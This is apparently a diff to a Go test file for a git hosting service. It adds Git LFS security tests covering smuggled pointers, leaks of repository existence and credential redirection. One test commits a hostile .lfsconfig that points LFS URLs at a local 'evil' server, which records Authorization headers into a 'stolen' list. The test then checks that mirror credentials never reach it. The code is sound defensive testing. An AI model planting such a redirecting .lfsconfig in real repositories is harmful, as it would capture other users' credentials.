@@ -9,6 +9,7 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"testing"
 
 	"github.com/qwq-inc/gitrepo/internal/client"
@@ -120,6 +121,101 @@ func TestGitLFS(t *testing.T) {
 			t.Fatalf("push with a dangling LFS pointer succeeded:\n%s", out)
 		}
 		mustContain(t, out, "ghost.bin: LFS object abababababab", "missing on the hub")
+	})
+
+	t.Run("a pushed .lfsconfig cannot redirect mirror credentials", func(t *testing.T) {
+		var mu sync.Mutex
+		var stolen []string
+		evil := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+			mu.Lock()
+			stolen = append(stolen, r.Method+" "+r.URL.Path+" auth="+r.Header.Get("Authorization"))
+			mu.Unlock()
+			w.Header().Set("LFS-Authenticate", `Basic realm="evil"`)
+			w.WriteHeader(http.StatusUnauthorized)
+		}))
+		defer evil.Close()
+		os.WriteFile(filepath.Join(work, ".lfsconfig"), []byte("[lfs]\n\turl = "+evil.URL+"/steal/info/lfs\n\tpushurl = "+evil.URL+"/steal/info/lfs\n"), 0o644)
+		extra := make([]byte, 50<<10)
+		rand.Read(extra)
+		os.WriteFile(filepath.Join(work, "second.bin"), extra, 0o644)
+		e.run(work, "add", ".lfsconfig", "second.bin")
+		e.run(work, "commit", "-q", "-m", "redirect LFS")
+		second := ""
+		for _, line := range strings.Split(e.run(work, "lfs", "ls-files", "--long"), "\n") {
+			if strings.HasSuffix(line, "second.bin") {
+				second = strings.Fields(line)[0]
+			}
+		}
+		// The client overrides the file for its own upload to the hub.
+		hubLFS := strings.TrimSuffix(hub, ".git") + ".git/info/lfs"
+		out := e.run(work, "-c", "lfs.url="+hubLFS, "-c", "lfs.pushurl="+hubLFS, "push", hub, "main")
+		mustContain(t, out, "[ok]       lfsmirror:assets")
+		mu.Lock()
+		defer mu.Unlock()
+		for _, req := range stolen {
+			if !strings.HasSuffix(req, "auth=") {
+				t.Fatalf("mirror credentials were sent to the .lfsconfig host: %v", stolen)
+			}
+		}
+		if len(stolen) > 0 {
+			t.Fatalf("the sync talked to the .lfsconfig host at all: %v", stolen)
+		}
+		if !lfs.Has(mirror, second, int64(len(extra))) {
+			t.Fatal("object not uploaded to the real mirror")
+		}
+	})
+
+	// A commit with an LFS pointer whose object was never uploaded, placed
+	// on the hub behind the hooks' back (as a fetched mirror backup or old
+	// history would be).
+	plain := filepath.Join(t.TempDir(), "plain")
+	e.run("", "init", "-q", "-b", "main", plain)
+	ghost := "version https://git-lfs.github.com/spec/v1\noid sha256:" + strings.Repeat("cd", 32) + "\nsize 99\n"
+	os.WriteFile(filepath.Join(plain, "ghost.bin"), []byte(ghost), 0o644)
+	e.run(plain, "add", "ghost.bin")
+	e.run(plain, "commit", "-q", "-m", "ghost pointer")
+
+	t.Run("content reachable only from refs/backup is still checked on push", func(t *testing.T) {
+		e.run(plain, "push", "-q", hubDir, "HEAD:refs/backup/20260101T000000.000Z/remotes/1/refs/heads/x")
+		out, err := gitCmd(plain, "push", hub, "HEAD:refs/heads/smuggled")
+		if err == nil {
+			t.Fatalf("push of a backed-up commit with a missing LFS object succeeded:\n%s", out)
+		}
+		mustContain(t, out, "ghost.bin: LFS object cdcdcdcdcdcd", "missing on the hub")
+	})
+
+	t.Run("a sync never pushes pointers whose object the hub lacks", func(t *testing.T) {
+		e.run(plain, "push", "-q", hubDir, "HEAD:refs/heads/legacy")
+		res := e.sync("media/assets", false)
+		ev := eventState(res, "lfsmirror")
+		if ev.State != "failed" || !strings.Contains(ev.Error, "not stored on the hub") {
+			t.Fatalf("sync with a missing LFS object: %+v", ev)
+		}
+		if _, ok := e.refs(mirror)["refs/heads/legacy"]; ok {
+			t.Fatal("the ref with the dangling pointer reached the mirror")
+		}
+		e.git.UpdateRefs(t.Context(), hubDir, []string{"delete refs/heads/legacy"})
+	})
+
+	t.Run("the LFS API does not reveal which private repositories exist", func(t *testing.T) {
+		post := func(path, token string) int {
+			req, _ := http.NewRequest(http.MethodPost, "http://"+e.hubAddr+path, strings.NewReader(`{"operation":"download","objects":[]}`))
+			if token != "" {
+				req.SetBasicAuth("x", token)
+			}
+			resp, err := http.DefaultClient.Do(req)
+			if err != nil {
+				t.Fatal(err)
+			}
+			resp.Body.Close()
+			return resp.StatusCode
+		}
+		if a, b := post("/media/nope.git/info/lfs/objects/batch", ""), post("/media/assets.git/info/lfs/objects/batch", ""); a != http.StatusUnauthorized || b != http.StatusUnauthorized {
+			t.Fatalf("anonymous: missing repo %d, private repo %d (both must be 401)", a, b)
+		}
+		if got := post("/media/nope.git/info/lfs/objects/batch", dev.Token); got != http.StatusNotFound {
+			t.Fatalf("authenticated, missing repo: %d", got)
+		}
 	})
 
 	t.Run("the batch API requires credentials", func(t *testing.T) {
